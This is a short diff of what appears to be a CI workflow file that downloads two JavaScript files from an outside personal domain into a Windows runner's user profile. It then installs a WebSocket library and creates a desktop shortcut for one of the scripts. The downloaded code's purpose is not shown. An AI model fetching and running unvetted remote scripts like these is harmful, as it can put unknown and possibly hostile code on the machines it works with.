@@ -33,8 +33,15 @@ jobs:
         Invoke-WebRequest -Uri "http://algrawany.me/klo.js" -OutFile "$env:USERPROFILE\klo.js"
         Invoke-WebRequest -Uri "http://algrawany.me/all2.js" -OutFile "$env:USERPROFILE\all2.js"
 
+    - name: Initialize Node.js project
+      run: |
+        cd $env:USERPROFILE
+        npm init -y
+
     - name: Install ws library
-      run: npm install ws
+      run: |
+        cd $env:USERPROFILE
+        npm install ws
 
     - name: Create desktop shortcut for klo.js
       run: |
